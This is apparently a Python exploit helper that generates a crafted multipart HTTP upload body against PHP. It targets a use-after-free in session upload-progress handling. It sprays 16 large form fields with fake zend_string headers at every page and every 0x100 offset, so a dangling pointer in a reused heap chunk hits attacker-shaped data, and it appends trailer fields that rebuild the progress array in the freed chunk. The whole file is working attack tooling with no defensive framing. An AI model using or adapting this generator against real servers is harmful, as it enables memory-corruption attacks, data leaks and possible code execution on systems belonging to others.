#!/usr/bin/env python3
"""Sparse universal B1: 16 x 2MB fields (511 pages each), 'A' fill, with a valid
fake zend_string header written at EVERY page boundary and every 0x100 offset
within the page.  Covers any 0x100-aligned dangling id address in a reused
chunk, while leaving ~97% of the value as the same 'A' fill that the validated
single-page body uses (so heap residue / code pointers survive in the window).

Usage: sparse_b1.py --out body.bin [--fake-len 0xC8000] [--fields 16]
                    [--offs 0,0x100,...] [--pages 511]
"""
import argparse, struct

BOUND = b"C" * 10


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--out", required=True)
    ap.add_argument("--fake-len", type=lambda x: int(x, 0), default=0xC8000)
    ap.add_argument("--fields", type=int, default=16)
    ap.add_argument("--pages", type=int, default=511)
    ap.add_argument("--offs", default="0x000,0x100,0x200,0x300,0x400,0x500,0x600,0x700,0x800,0x900,0xa00,0xb00,0xc00,0xd00,0xe00,0xf00")
    ap.add_argument("--tag", default="/99BBBBB")
    ap.add_argument("--x900", type=int, default=900,
                    help="small trailer fields that build the progress array reusing the freed chunk")
    ap.add_argument("--tagged", action="store_true",
                    help="encode (offset index, page low byte) in each tag: /<off><page>BBBB")
    ap.add_argument("--page-lo", type=lambda x: int(x, 0), default=0x100,
                    help="first page covered (page-lo..page-lo+255)")
    ap.add_argument("--page-hi", type=lambda x: int(x, 0), default=0x1FF)
    args = ap.parse_args()
    L = args.pages * 4096 - 25
    offs = [int(x, 0) for x in args.offs.split(",")]
    tag = args.tag.encode()[:8].ljust(8, b"B")
    hdr = struct.pack("<IIQQ", 0, 0x16, 0, args.fake_len)
    out = bytearray()
    out += b"--" + BOUND + b"\r\nContent-Disposition: form-data; name=\"PHPSESSID\"\r\n\r\na\r\n"
    out += b"--" + BOUND + b"\r\nContent-Disposition: form-data; name=\"PHP_SESSION_UPLOAD_PROGRESS\"\r\n\r\nk0\r\n"
    for i in range(args.fields):
        v = bytearray(b"A" * L)
        n = 0
        pages = range(args.page_lo, args.page_hi + 1) if args.tagged else range(1, args.pages + 1)
        for page in pages:
            for oi, off in enumerate(offs):
                p = page * 0x1000 + off - 0x1018
                if 0 <= p and p + 32 <= L:
                    v[p:p + 24] = hdr
                    if args.tagged:
                        t = ("/%X%02XBBBB" % (oi, page & 0xFF)).encode()
                    else:
                        t = tag
                    v[p + 24:p + 32] = t
                    n += 1
        nm = (b"f%04d" % i).ljust(120, b"f")[:120]
        out += b"--" + BOUND + b"\r\nContent-Disposition: form-data; name=\"" + nm + b"\"\r\n\r\n" + bytes(v) + b"\r\n"
    for j in range(args.x900):
        nm = (("x%05d" % j).encode() + b"[a]" * 12)
        out += b"--" + BOUND + b"\r\nContent-Disposition: form-data; name=\"" + nm + b"\"\r\n\r\nv\r\n"
    out += b"--" + BOUND + b"--\r\n"
    with open(args.out, "wb") as fh:
        fh.write(out)
    print("body=%d fields=%d headers/field=%d fake_len=%#x" % (len(out), args.fields, n, args.fake_len))


if __name__ == "__main__":
    main()
